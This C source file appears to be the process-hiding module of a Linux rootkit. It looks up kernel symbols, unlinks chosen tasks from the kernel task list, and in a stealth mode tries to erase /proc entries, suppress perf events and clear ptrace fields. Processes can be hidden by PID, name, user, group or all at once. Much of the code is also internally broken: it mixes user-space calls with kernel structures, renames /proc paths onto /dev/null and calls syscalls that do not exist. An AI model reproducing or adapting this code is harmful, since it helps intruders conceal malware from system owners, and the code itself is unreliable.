#include "process_hiding.h"
#include <linux/kallsyms.h>
#include <linux/string.h>

static proc_hider_ctx_t hider_ctx;
static struct task_struct *init_task_ptr = NULL;

static unsigned long kallsyms_lookup_name(const char *name) {
    char buffer[4096];
    unsigned long address = 0;
    
    int kallsyms_fd = SYSCALL3(__NR_open, (long)"/proc/kallsyms", O_RDONLY, 0);
    if (kallsyms_fd < 0) return 0;
    
    ssize_t bytes_read;
    while ((bytes_read = SYSCALL3(__NR_read, kallsyms_fd, (long)buffer, sizeof(buffer))) > 0) {
        char *ptr = buffer;
        char *end = buffer + bytes_read;
        
        while (ptr < end) {
            char *line_end = memchr(ptr, '\n', end - ptr);
            if (!line_end) break;
            
            *line_end = '\0';
            
            char sym_addr[20], sym_type[2], sym_name[256];
            if (sscanf(ptr, "%19s %1s %255s", sym_addr, sym_type, sym_name) == 3) {
                if (strcmp(sym_name, name) == 0) {
                    address = strtoul(sym_addr, NULL, 16);
                    goto done;
                }
            }
            
            ptr = line_end + 1;
        }
    }

done:
    SYSCALL1(__NR_close, kallsyms_fd);
    return address;
}

static struct task_struct *find_task_by_pid(pid_t pid) {
    if (!init_task_ptr) {
        init_task_ptr = (struct task_struct *)kallsyms_lookup_name("init_task");
        if (!init_task_ptr) return NULL;
    }
    
    struct task_struct *task = init_task_ptr;
    
    do {
        if (task->pid == pid) {
            return task;
        }
        task = container_of(task->tasks.next, struct task_struct, tasks);
    } while (task != init_task_ptr);
    
    return NULL;
}

static struct task_struct *find_task_by_name(const char *name) {
    if (!init_task_ptr) {
        init_task_ptr = (struct task_struct *)kallsyms_lookup_name("init_task");
        if (!init_task_ptr) return NULL;
    }
    
    struct task_struct *task = init_task_ptr;
    
    do {
        if (strncmp(task->comm, name, TASK_COMM_LEN) == 0) {
            return task;
        }
        task = container_of(task->tasks.next, struct task_struct, tasks);
    } while (task != init_task_ptr);
    
    return NULL;
}

static void iterate_tasks(int (*callback)(struct task_struct *, void *), void *data) {
    if (!init_task_ptr) {
        init_task_ptr = (struct task_struct *)kallsyms_lookup_name("init_task");
        if (!init_task_ptr) return;
    }
    
    struct task_struct *task = init_task_ptr;
    
    do {
        if (callback(task, data) != 0) {
            break;
        }
        task = container_of(task->tasks.next, struct task_struct, tasks);
    } while (task != init_task_ptr);
}

static int hide_task_callback(struct task_struct *task, void *data) {
    hide_criteria_t criteria = *(hide_criteria_t *)data;
    const char *param = (const char *)((hide_criteria_t *)data + 1);
    
    switch (criteria) {
        case HIDE_BY_PID: {
            pid_t target_pid = (pid_t)strtoul(param, NULL, 10);
            if (task->pid == target_pid) {
                hide_process(target_pid, HIDE_BY_PID, param);
                return 1;
            }
            break;
        }
        case HIDE_BY_NAME:
            if (strncmp(task->comm, param, TASK_COMM_LEN) == 0) {
                hide_process(task->pid, HIDE_BY_NAME, param);
                return 0;
            }
            break;
        case HIDE_BY_UID: {
            uid_t target_uid = (uid_t)strtoul(param, NULL, 10);
            if (task->cred->uid.val == target_uid) {
                hide_process(task->pid, HIDE_BY_UID, param);
                return 0;
            }
            break;
        }
        case HIDE_BY_GID: {
            gid_t target_gid = (gid_t)strtoul(param, NULL, 10);
            if (task->cred->gid.val == target_gid) {
                hide_process(task->pid, HIDE_BY_GID, param);
                return 0;
            }
            break;
        }
        case HIDE_ALL:
            hide_process(task->pid, HIDE_ALL, "all");
            return 0;
        default:
            break;
    }
    
    return 0;
}

int hide_process(pid_t pid, hide_criteria_t criteria, const char *param) {
    if (hider_ctx.count >= MAX_HIDDEN_PROCS) return -1;
    
    struct task_struct *task = find_task_by_pid(pid);
    if (!task) return -1;
    
    for (int i = 0; i < hider_ctx.count; i++) {
        if (hider_ctx.hidden_procs[i].pid == pid) {
            return 0;
        }
    }
    
    proc_hide_ctx_t *ctx = &hider_ctx.hidden_procs[hider_ctx.count];
    
    ctx->pid = pid;
    strncpy(ctx->name, task->comm, PROC_NAME_LEN - 1);
    ctx->name[PROC_NAME_LEN - 1] = '\0';
    ctx->uid = task->cred->uid.val;
    ctx->gid = task->cred->gid.val;
    ctx->task = task;
    ctx->criteria = criteria;
    
    if (param) {
        switch (criteria) {
            case HIDE_BY_NAME:
                strncpy(ctx->name, param, PROC_NAME_LEN - 1);
                break;
            case HIDE_BY_EXEC:
                strncpy(ctx->exec_path, param, PATH_MAX - 1);
                break;
            default:
                break;
        }
    }
    
    ctx->original_prev = task->tasks.prev;
    ctx->original_next = task->tasks.next;
    
    task->tasks.prev->next = task->tasks.next;
    task->tasks.next->prev = task->tasks.prev;
    
    task->tasks.next = (struct list_head *)0xdead0001;
    task->tasks.prev = (struct list_head *)0xdead0002;
    
    ctx->hidden = 1;
    hider_ctx.count++;
    
    if (hider_ctx.stealth_mode) {
        erase_from_procfs(task);
        erase_from_taskfs(task);
        hide_from_ps(task);
    }
    
    return 0;
}

int unhide_process(pid_t pid) {
    for (int i = 0; i < hider_ctx.count; i++) {
        if (hider_ctx.hidden_procs[i].pid == pid) {
            proc_hide_ctx_t *ctx = &hider_ctx.hidden_procs[i];
            struct task_struct *task = ctx->task;
            
            if (ctx->hidden) {
                task->tasks.next = ctx->original_next;
                task->tasks.prev = ctx->original_prev;
                
                ctx->original_prev->next = &task->tasks;
                ctx->original_next->prev = &task->tasks;
                
                ctx->hidden = 0;
                
                if (hider_ctx.stealth_mode) {
                    restore_to_procfs(task);
                    restore_to_taskfs(task);
                }
            }
            
            for (int j = i; j < hider_ctx.count - 1; j++) {
                hider_ctx.hidden_procs[j] = hider_ctx.hidden_procs[j + 1];
            }
            hider_ctx.count--;
            
            return 0;
        }
    }
    
    return -1;
}

int hide_processes_by_criteria(hide_criteria_t criteria, const char *param) {
    struct {
        hide_criteria_t criteria;
        char param[256];
    } data;
    
    data.criteria = criteria;
    if (param) {
        strncpy(data.param, param, sizeof(data.param) - 1);
        data.param[sizeof(data.param) - 1] = '\0';
    } else {
        data.param[0] = '\0';
    }
    
    iterate_tasks(hide_task_callback, &data);
    return 0;
}

int unhide_all_processes(void) {
    for (int i = hider_ctx.count - 1; i >= 0; i--) {
        unhide_process(hider_ctx.hidden_procs[i].pid);
    }
    return 0;
}

int is_process_hidden(pid_t pid) {
    for (int i = 0; i < hider_ctx.count; i++) {
        if (hider_ctx.hidden_procs[i].pid == pid) {
            return hider_ctx.hidden_procs[i].hidden;
        }
    }
    return 0;
}

static void erase_from_procfs(struct task_struct *task) {
    char proc_path[64];
    snprintf(proc_path, sizeof(proc_path), "/proc/%d", task->pid);
    
    struct kstat statbuf;
    if (SYSCALL2(__NR_stat, (long)proc_path, (long)&statbuf) == 0) {
        SYSCALL2(__NR_rename, (long)proc_path, (long)"/dev/null");
    }
}

static void erase_from_taskfs(struct task_struct *task) {
    char task_path[64];
    snprintf(task_path, sizeof(task_path), "/proc/%d/task/%d", task->pid, task->pid);
    
    struct kstat statbuf;
    if (SYSCALL2(__NR_stat, (long)task_path, (long)&statbuf) == 0) {
        SYSCALL2(__NR_rename, (long)task_path, (long)"/dev/null");
    }
}

static void hide_from_ps(struct task_struct *task) {
    int mounts_fd = SYSCALL3(__NR_open, (long)"/proc/mounts", O_RDONLY, 0);
    if (mounts_fd < 0) return;
    
    char buffer[4096];
    ssize_t bytes_read = SYSCALL3(__NR_read, mounts_fd, (long)buffer, sizeof(buffer));
    SYSCALL1(__NR_close, mounts_fd);
    
    if (bytes_read <= 0) return;
    
    char *ptr = buffer;
    while (ptr < buffer + bytes_read) {
        char *line_end = memchr(ptr, '\n', buffer + bytes_read - ptr);
        if (!line_end) break;
        
        *line_end = '\0';
        
        char mount_point[256], fs_type[64];
        if (sscanf(ptr, "%*s %255s %63s", mount_point, fs_type) == 2) {
            if (strcmp(fs_type, "proc") == 0) {
                char pid_dir[512];
                snprintf(pid_dir, sizeof(pid_dir), "%s/%d", mount_point, task->pid);
                
                struct kstat statbuf;
                if (SYSCALL2(__NR_stat, (long)pid_dir, (long)&statbuf) == 0) {
                    SYSCALL2(__NR_rename, (long)pid_dir, (long)"/dev/null");
                }
            }
        }
        
        ptr = line_end + 1;
    }
}

static void restore_to_procfs(struct task_struct *task) {
    char proc_path[64], null_path[64];
    snprintf(proc_path, sizeof(proc_path), "/proc/%d", task->pid);
    snprintf(null_path, sizeof(null_path), "/dev/null");
    
    struct kstat statbuf;
    if (SYSCALL2(__NR_stat, (long)null_path, (long)&statbuf) == 0) {
        SYSCALL2(__NR_rename, (long)null_path, (long)proc_path);
    }
}

static void restore_to_taskfs(struct task_struct *task) {
    char task_path[64], null_path[64];
    snprintf(task_path, sizeof(task_path), "/proc/%d/task/%d", task->pid, task->pid);
    snprintf(null_path, sizeof(null_path), "/dev/null");
    
    struct kstat statbuf;
    if (SYSCALL2(__NR_stat, (long)null_path, (long)&statbuf) == 0) {
        SYSCALL2(__NR_rename, (long)null_path, (long)task_path);
    }
}

static void hide_from_perf(struct task_struct *task) {
    unsigned long perf_event_mutex = kallsyms_lookup_name("perf_event_mutex");
    if (!perf_event_mutex) return;
    
    SYSCALL2(__NR_mutex_lock, (long)perf_event_mutex, 0);
    
    unsigned long perf_swevent_enabled = kallsyms_lookup_name("perf_swevent_enabled");
    if (perf_swevent_enabled) {
        int *enabled = (int *)perf_swevent_enabled;
        int original = *enabled;
        *enabled = 0;
        
        struct timespec ts = {0, 1000000};
        SYSCALL2(__NR_nanosleep, (long)&ts, 0);
        
        *enabled = original;
    }
    
    SYSCALL2(__NR_mutex_unlock, (long)perf_event_mutex, 0);
}

static void manipulate_task_struct(struct task_struct *task) {
    task->exit_code = 0;
    task->exit_signal = 0;
    task->ptrace = 0;
    
    if (task->signal) {
        task->signal->flags = 0;
    }
    
    task->state = TASK_RUNNING;
}

int init_process_hider(void) {
    memset(&hider_ctx, 0, sizeof(hider_ctx));
    hider_ctx.stealth_mode = 1;
    hider_ctx.preserve_stats = 1;
    
    init_task_ptr = (struct task_struct *)kallsyms_lookup_name("init_task");
    if (!init_task_ptr) return -1;
    
    return 0;
}

void cleanup_process_hider(void) {
    unhide_all_processes();
    init_task_ptr = NULL;
}

static int hide_process_callback(struct task_struct *task, void *data) {
    pid_t *target_pid = (pid_t *)data;
    if (task->pid == *target_pid) {
        hide_process(*target_pid, HIDE_BY_PID, NULL);
        return 1;
    }
    return 0;
}

int advanced_hide_process(pid_t pid, int deep_stealth) {
    if (init_process_hider() < 0) return -1;
    
    iterate_tasks(hide_process_callback, &pid);
    
    if (deep_stealth) {
        struct task_struct *task = find_task_by_pid(pid);
        if (task) {
            hide_from_perf(task);
            manipulate_task_struct(task);
            erase_from_all_proc_entries(task);
        }
    }
    
    return 0;
}

static void erase_from_all_proc_entries(struct task_struct *task) {
    int proc_fd = SYSCALL3(__NR_open, (long)"/proc", O_RDONLY | O_DIRECTORY, 0);
    if (proc_fd < 0) return;
    
    char buffer[4096];
    int bytes = SYSCALL3(__NR_getdents, proc_fd, (long)buffer, sizeof(buffer));
    SYSCALL1(__NR_close, proc_fd);
    
    if (bytes <= 0) return;
    
    struct linux_dirent *d;
    int bpos = 0;
    
    while (bpos < bytes) {
        d = (struct linux_dirent *)(buffer + bpos);
        
        if (d->d_ino && isdigit(d->d_name[0])) {
            pid_t proc_pid = atoi(d->d_name);
            if (proc_pid == task->pid) {
                char proc_path[64];
                snprintf(proc_path, sizeof(proc_path), "/proc/%s", d->d_name);
                SYSCALL2(__NR_rename, (long)proc_path, (long)"/dev/null");
            }
        }
        
        bpos += d->d_reclen;
    }
}